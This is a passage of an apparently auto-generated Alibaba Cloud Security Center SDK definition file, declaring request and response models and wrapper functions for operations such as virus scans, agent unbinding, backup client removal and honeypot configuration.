  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AE6229A0-BDBE-534C-A3F8-095EBXXXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model SaveSuspEventUserSettingResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SaveSuspEventUserSettingResponseBody(name='body'),
}

async function saveSuspEventUserSettingWithOptions(request: SaveSuspEventUserSettingRequest, runtime: Util.RuntimeOptions): SaveSuspEventUserSettingResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.levelsOn)) {
    query['LevelsOn'] = request.levelsOn;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SaveSuspEventUserSetting',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function saveSuspEventUserSetting(request: SaveSuspEventUserSettingRequest): SaveSuspEventUserSettingResponse {
  var runtime = new Util.RuntimeOptions{};
  return saveSuspEventUserSettingWithOptions(request, runtime);
}

model SetClusterInterceptionConfigRequest {
  clusterIds?: string(name='ClusterIds', example='c60b77fe62093480db6164a3c2fa****'),
  switchOn?: int32(name='SwitchOn', example='1'),
  switchType?: int32(name='SwitchType', example='0'),
}

model SetClusterInterceptionConfigResponseBody = {
  requestId?: string(name='RequestId', example='74AB990C-539B-579B-9239-B8A2036B7337'),
  result?: boolean(name='Result', example='true'),
}

model SetClusterInterceptionConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SetClusterInterceptionConfigResponseBody(name='body'),
}

async function setClusterInterceptionConfigWithOptions(request: SetClusterInterceptionConfigRequest, runtime: Util.RuntimeOptions): SetClusterInterceptionConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterIds)) {
    query['ClusterIds'] = request.clusterIds;
  }
  if (!Util.isUnset(request.switchOn)) {
    query['SwitchOn'] = request.switchOn;
  }
  if (!Util.isUnset(request.switchType)) {
    query['SwitchType'] = request.switchType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SetClusterInterceptionConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function setClusterInterceptionConfig(request: SetClusterInterceptionConfigRequest): SetClusterInterceptionConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return setClusterInterceptionConfigWithOptions(request, runtime);
}

model SetRegistryScanDayNumRequest {
  scanDayNum?: int32(name='ScanDayNum', description='The cycle at which you want to scan your images. Unit: days.', example='1'),
}

model SetRegistryScanDayNumResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='48483161-F328-5A12-AB78-3EB81F37****'),
}

model SetRegistryScanDayNumResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SetRegistryScanDayNumResponseBody(name='body'),
}

async function setRegistryScanDayNumWithOptions(request: SetRegistryScanDayNumRequest, runtime: Util.RuntimeOptions): SetRegistryScanDayNumResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.scanDayNum)) {
    query['ScanDayNum'] = request.scanDayNum;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SetRegistryScanDayNum',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function setRegistryScanDayNum(request: SetRegistryScanDayNumRequest): SetRegistryScanDayNumResponse {
  var runtime = new Util.RuntimeOptions{};
  return setRegistryScanDayNumWithOptions(request, runtime);
}

model StartBaselineSecurityCheckRequest {
  itemIds?: [ long ](name='ItemIds', description='The IDs of the check items.

> To perform a check task on cloud service configurations, you must specify the ID of the check item. You can call the [DescribeRiskItemType](~~DescribeRiskItemType~~) operation to query the IDs of check items.'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='106.11.XX.XX'),
  type?: string(name='Type', description='The type of the check task. Valid values:

*   **check**
*   **verify**', example='verify'),
}

model StartBaselineSecurityCheckResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='48D2E9A9-A1B0-4295-B727-0995757C47E9'),
}

model StartBaselineSecurityCheckResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StartBaselineSecurityCheckResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request StartBaselineSecurityCheckRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return StartBaselineSecurityCheckResponse
 */
// Deprecated
async function startBaselineSecurityCheckWithOptions(request: StartBaselineSecurityCheckRequest, runtime: Util.RuntimeOptions): StartBaselineSecurityCheckResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.itemIds)) {
    query['ItemIds'] = request.itemIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'StartBaselineSecurityCheck',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request StartBaselineSecurityCheckRequest
  * @return StartBaselineSecurityCheckResponse
 */
// Deprecated
async function startBaselineSecurityCheck(request: StartBaselineSecurityCheckRequest): StartBaselineSecurityCheckResponse {
  var runtime = new Util.RuntimeOptions{};
  return startBaselineSecurityCheckWithOptions(request, runtime);
}

model StartDiscoverDatabaseTaskResponseBody = {
  createMark?: string(name='CreateMark', description='The ID of the scan task.', example='48bced6d-2aee-4fa2-9aba-b846b77b****'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F46921AF-CC55-5971-92C9-7E09E160****'),
}

model StartDiscoverDatabaseTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StartDiscoverDatabaseTaskResponseBody(name='body'),
}

async function startDiscoverDatabaseTaskWithOptions(runtime: Util.RuntimeOptions): StartDiscoverDatabaseTaskResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'StartDiscoverDatabaseTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function startDiscoverDatabaseTask(): StartDiscoverDatabaseTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return startDiscoverDatabaseTaskWithOptions(runtime);
}

model StartPreCheckDatabaseRequest {
  databaseType?: string(name='DatabaseType', example='MYSQL'),
  instanceUuid?: string(name='InstanceUuid', example='ec1c0ba21d2911ed800000163e0e****'),
  uniRegionId?: string(name='UniRegionId', example='cn-hongkong'),
}

model StartPreCheckDatabaseResponseBody = {
  createMark?: string(name='CreateMark', example='t-0006d4pydyir6l1k****'),
  requestId?: string(name='RequestId', example='F6DC2DFF-AB3A-563A-8FC2-3D0D991E****'),
}

model StartPreCheckDatabaseResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StartPreCheckDatabaseResponseBody(name='body'),
}

async function startPreCheckDatabaseWithOptions(request: StartPreCheckDatabaseRequest, runtime: Util.RuntimeOptions): StartPreCheckDatabaseResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.databaseType)) {
    query['DatabaseType'] = request.databaseType;
  }
  if (!Util.isUnset(request.instanceUuid)) {
    query['InstanceUuid'] = request.instanceUuid;
  }
  if (!Util.isUnset(request.uniRegionId)) {
    query['UniRegionId'] = request.uniRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'StartPreCheckDatabase',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function startPreCheckDatabase(request: StartPreCheckDatabaseRequest): StartPreCheckDatabaseResponse {
  var runtime = new Util.RuntimeOptions{};
  return startPreCheckDatabaseWithOptions(request, runtime);
}

model StartVirusScanTaskRequest {
  targetInfo?: string(name='TargetInfo', example='[{"type":"uuid","name":"Host001","target":"503201a7-14c6-4280-801b-1169ed42****"}]'),
}

model StartVirusScanTaskResponseBody = {
  requestId?: string(name='RequestId', example='DAE17926-4ABE-4DBD-9600-DDCB9B200F35'),
  scanTaskId?: long(name='ScanTaskId', example='282832'),
}

model StartVirusScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: StartVirusScanTaskResponseBody(name='body'),
}

async function startVirusScanTaskWithOptions(request: StartVirusScanTaskRequest, runtime: Util.RuntimeOptions): StartVirusScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.targetInfo)) {
    query['TargetInfo'] = request.targetInfo;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'StartVirusScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function startVirusScanTask(request: StartVirusScanTaskRequest): StartVirusScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return startVirusScanTaskWithOptions(request, runtime);
}

model SubmitCheckResponseBody = {
  data?: {
    operateCode?: string(name='OperateCode', example='Throttling'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='CE8369A6-A843-5E1B-A613-78E6920D****'),
  taskId?: string(name='TaskId', example='5fe3f65d-4012-455d-8232-2a98a858****'),
}

model SubmitCheckResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SubmitCheckResponseBody(name='body'),
}

async function submitCheckWithOptions(runtime: Util.RuntimeOptions): SubmitCheckResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'SubmitCheck',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function submitCheck(): SubmitCheckResponse {
  var runtime = new Util.RuntimeOptions{};
  return submitCheckWithOptions(runtime);
}

model UnbindAegisRequest {
  uuids?: string(name='Uuids', description='The UUID of the server that you want to unbind. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
}

model UnbindAegisResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='825F5526-2A17-4279-857F-F790E9590171'),
}

model UnbindAegisResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UnbindAegisResponseBody(name='body'),
}

/**
  * If you no longer require protection for servers that are not deployed on Alibaba Cloud, you can call this operation to unbind the servers from Security Center. After you unbind a server that is not deployed on Alibaba Cloud from Security Center, the server no longer consumes the quota of protected servers or protected server vCPUs. This way, you can install the Security Center agent on other servers to meet your business requirements.
  * > You can unbind only the servers that are not deployed on Alibaba Cloud from Security Center. If you use an Alibaba Cloud Elastic Compute Service (ECS) instance, you do not need to unbind the ECS instance. If you uninstall the Security Center agent from an ECS instance, the ECS instance still exists as a disconnected server in the asset list of the Security Center console. The ECS instance is not removed from the asset list.
  * **Prerequisites**
  * *   The server that you want to unbind from Security Center is not deployed on Alibaba Cloud and the Security Center agent is disabled for the server. In this case, the agent is in the Close state and Security Center does not protect the server. You can call the [PauseClient](~~PauseClient~~) operation to disable the agent.
  * *   The client protection feature is disabled for the server that you want to unbind from Security Center. For more information about how to disable the client protection feature, see [Use the client protection feature](https://www.alibabacloud.com/help/en/security-center/latest/local-file-detection-engine).
  *
  * @param request UnbindAegisRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return UnbindAegisResponse
 */
async function unbindAegisWithOptions(request: UnbindAegisRequest, runtime: Util.RuntimeOptions): UnbindAegisResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UnbindAegis',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * If you no longer require protection for servers that are not deployed on Alibaba Cloud, you can call this operation to unbind the servers from Security Center. After you unbind a server that is not deployed on Alibaba Cloud from Security Center, the server no longer consumes the quota of protected servers or protected server vCPUs. This way, you can install the Security Center agent on other servers to meet your business requirements.
  * > You can unbind only the servers that are not deployed on Alibaba Cloud from Security Center. If you use an Alibaba Cloud Elastic Compute Service (ECS) instance, you do not need to unbind the ECS instance. If you uninstall the Security Center agent from an ECS instance, the ECS instance still exists as a disconnected server in the asset list of the Security Center console. The ECS instance is not removed from the asset list.
  * **Prerequisites**
  * *   The server that you want to unbind from Security Center is not deployed on Alibaba Cloud and the Security Center agent is disabled for the server. In this case, the agent is in the Close state and Security Center does not protect the server. You can call the [PauseClient](~~PauseClient~~) operation to disable the agent.
  * *   The client protection feature is disabled for the server that you want to unbind from Security Center. For more information about how to disable the client protection feature, see [Use the client protection feature](https://www.alibabacloud.com/help/en/security-center/latest/local-file-detection-engine).
  *
  * @param request UnbindAegisRequest
  * @return UnbindAegisResponse
 */
async function unbindAegis(request: UnbindAegisRequest): UnbindAegisResponse {
  var runtime = new Util.RuntimeOptions{};
  return unbindAegisWithOptions(request, runtime);
}

model UninstallBackupClientRequest {
  policyVersion?: string(name='PolicyVersion', example='2.0.0'),
  uuid?: string(name='Uuid', example='D0D6E6E4-CB8C-4897-B852-46AEFDA0****'),
  uuidList?: [ string ](name='UuidList', example='["D0D6E6E4-CB8C-4897-B852-46AEFDA0****", "3bb30859-b3b5-4f28-868f-b0892c98****"]'),
}

model UninstallBackupClientResponseBody = {
  requestId?: string(name='RequestId', example='8eec3b63-18af-454b-8c17-aabcf7190b70'),
}

model UninstallBackupClientResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UninstallBackupClientResponseBody(name='body'),
}

async function uninstallBackupClientWithOptions(request: UninstallBackupClientRequest, runtime: Util.RuntimeOptions): UninstallBackupClientResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UninstallBackupClient',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function uninstallBackupClient(request: UninstallBackupClientRequest): UninstallBackupClientResponse {
  var runtime = new Util.RuntimeOptions{};
  return uninstallBackupClientWithOptions(request, runtime);
}

model UninstallUniBackupAgentRequest {
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

> You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='123'),
}

model UninstallUniBackupAgentResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9D97AFC3-AA58-5B8F-BBC4-16D7D8AB****'),
}

model UninstallUniBackupAgentResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UninstallUniBackupAgentResponseBody(name='body'),
}

async function uninstallUniBackupAgentWithOptions(request: UninstallUniBackupAgentRequest, runtime: Util.RuntimeOptions): UninstallUniBackupAgentResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UninstallUniBackupAgent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function uninstallUniBackupAgent(request: UninstallUniBackupAgentRequest): UninstallUniBackupAgentResponse {
  var runtime = new Util.RuntimeOptions{};
  return uninstallUniBackupAgentWithOptions(request, runtime);
}

model UpdateHoneypotRequest {
  honeypotId?: string(name='HoneypotId', example='945607c2ae2a1a737c04599d6608065688bfc6048d9b9d306ce8dc8191c278b4'),
  honeypotName?: string(name='HoneypotName', example='ExtMail'),
  lang?: string(name='Lang'),
  meta?: string(name='Meta', example='{\\"burp\\":\\"open\\",\\"webshell\\":\\"open\\",\\"trojan_git\\":\\"close\\",\\"portrait_option\\":\\"true\\"}'),
}

model UpdateHoneypotResponseBody = {
  code?: string(name='Code', example='200'),
  data?: {
    honeypotId?: string(name='HoneypotId', example='9bf8cd373112263d4bc102fc5dba9d9f812ee05d4d35c487d330d52e937f****'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', example='Webmin'),
    honeypotImageName?: string(name='HoneypotImageName', example='webpage'),
    honeypotName?: string(name='HoneypotName', example='hyl-phpmyadmin'),
    nodeId?: string(name='NodeId', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
    presetId?: string(name='PresetId', example='868a7579-00b5-4a74-999d-8bd3f411e8a3'),
    state?: [ string ](name='State'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='3B323ADD-6CF8-51F6-9047-2F0A4E3F5EFD'),
  success?: boolean(name='Success', example='true'),
}

model UpdateHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotResponseBody(name='body'),
}

async function updateHoneypotWithOptions(request: UpdateHoneypotRequest, runtime: Util.RuntimeOptions): UpdateHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotId)) {
    query['HoneypotId'] = request.honeypotId;
  }
  if (!Util.isUnset(request.honeypotName)) {
    query['HoneypotName'] = request.honeypotName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.meta)) {
    query['Meta'] = request.meta;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateHoneypot(request: UpdateHoneypotRequest): UpdateHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotWithOptions(request, runtime);
}

model UpdateHoneypotNodeRequest {
  availableProbeNum?: int32(name='AvailableProbeNum', example='20'),
  nodeId?: string(name='NodeId', description='The HTTP status code returned.', example='67ab3f4c-3db5-4fc3-b51f-00f8bfabfa08'),
  nodeName?: string(name='NodeName', description='The ID of the request, which is used to locate and troubleshoot issues.', example='HoneypotNodeTest'),
  securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList'),
}

model UpdateHoneypotNodeResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='753D92B3-A062-544F-8E7B-C813AA9FA9FC'),
  success?: boolean(name='Success', example='true'),
}

model UpdateHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotNodeResponseBody(name='body'),
}

async function updateHoneypotNodeWithOptions(request: UpdateHoneypotNodeRequest, runtime: Util.RuntimeOptions): UpdateHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.availableProbeNum)) {
    query['AvailableProbeNum'] = request.availableProbeNum;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.securityGroupProbeIpList)) {
    query['SecurityGroupProbeIpList'] = request.securityGroupProbeIpList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateHoneypotNode(request: UpdateHoneypotNodeRequest): UpdateHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotNodeWithOptions(request, runtime);
}

model UpdateHoneypotPresetRequest {
  honeypotImageName?: string(name='HoneypotImageName', example='metabase'),
  honeypotPresetId?: string(name='HoneypotPresetId', example='f75eddce-e9d3-4a88-af95-b10b6f65xxxx'),
  lang?: string(name='Lang', example='zh'),
  meta?: string(name='Meta', example='{"portrait_option":true,"burp":"open"}'),
  presetName?: string(name='PresetName', example='apc_web_python'),
}

model UpdateHoneypotPresetResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='60922C83-6B19-5A57-8F13-4663C6D391F4'),
  success?: boolean(name='Success', example='true'),
}

model UpdateHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotPresetResponseBody(name='body'),
}

async function updateHoneypotPresetWithOptions(request: UpdateHoneypotPresetRequest, runtime: Util.RuntimeOptions): UpdateHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.honeypotPresetId)) {
    query['HoneypotPresetId'] = request.honeypotPresetId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.meta)) {
    query['Meta'] = request.meta;
  }
  if (!Util.isUnset(request.presetName)) {
    query['PresetName'] = request.presetName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateHoneypotPreset(request: UpdateHoneypotPresetRequest): UpdateHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotPresetWithOptions(request, runtime);
}

model UpdateHoneypotProbeRequest {
  arp?: boolean(name='Arp', example='false'),
  displayName?: string(name='DisplayName', example='svwsx-vpc-4430'),
  lang?: string(name='Lang', example='zh'),
  ping?: boolean(name='Ping', example='true'),
  probeId?: string(name='ProbeId', example='bbe7e382-956f-473e-beed-bc73a258****'),
  serviceIpList?: [ string ](name='ServiceIpList'),
}

model UpdateHoneypotProbeResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='AB62FFAA-E1A5-5D7C-8D97-0F16C6A6F520'),
  success?: boolean(name='Success', example='true'),
}

model UpdateHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotProbeResponseBody(name='body'),
}

async function updateHoneypotProbeWithOptions(request: UpdateHoneypotProbeRequest, runtime: Util.RuntimeOptions): UpdateHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.arp)) {
    query['Arp'] = request.arp;
  }
  if (!Util.isUnset(request.displayName)) {
    query['DisplayName'] = request.displayName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.ping)) {
    query['Ping'] = request.ping;
  }
  if (!Util.isUnset(request.probeId)) {
    query['ProbeId'] = request.probeId;
  }
  if (!Util.isUnset(request.serviceIpList)) {
    query['ServiceIpList'] = request.serviceIpList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateHoneypotProbe(request: UpdateHoneypotProbeRequest): UpdateHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotProbeWithOptions(request, runtime);
}

model UpdateJenkinsImageRegistryNameRequest {
  registryId?: long(name='RegistryId', example='25090'),
  registryName?: string(name='RegistryName', example='a0603tk1'),
  sourceIp?: string(name='SourceIp', example='121.33.XXX.XXX'),
}

model UpdateJenkinsImageRegistryNameResponseBody = {
  data?: boolean(name='Data', example='true'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  requestId?: string(name='RequestId', example='4347E985-6E64-467B-96EC-30D4EA9E****'),
  timeCost?: long(name='TimeCost', example='1'),
}

model UpdateJenkinsImageRegistryNameResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateJenkinsImageRegistryNameResponseBody(name='body'),
}

async function updateJenkinsImageRegistryNameWithOptions(request: UpdateJenkinsImageRegistryNameRequest, runtime: Util.RuntimeOptions): UpdateJenkinsImageRegistryNameResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.registryId)) {
    body['RegistryId'] = request.registryId;
  }
  if (!Util.isUnset(request.registryName)) {
    body['RegistryName'] = request.registryName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'UpdateJenkinsImageRegistryName',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateJenkinsImageRegistryName(request: UpdateJenkinsImageRegistryNameRequest): UpdateJenkinsImageRegistryNameResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateJenkinsImageRegistryNameWithOptions(request, runtime);
}

model UpdateJenkinsImageRegistryPersistenceDayRequest {
  persistenceDay?: int32(name='PersistenceDay', example='30'),
  registryId?: long(name='RegistryId', example='25363'),
  sourceIp?: string(name='SourceIp', example='106.11.XXX.XXX'),
}

model UpdateJenkinsImageRegistryPersistenceDayResponseBody = {
  data?: boolean(name='Data', example='true'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  requestId?: string(name='RequestId', example='69F88BA1-004C-51E2-BF5C-A3220E5A****'),
  timeCost?: long(name='TimeCost', example='1'),
}

model UpdateJenkinsImageRegistryPersistenceDayResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateJenkinsImageRegistryPersistenceDayResponseBody(name='body'),
}

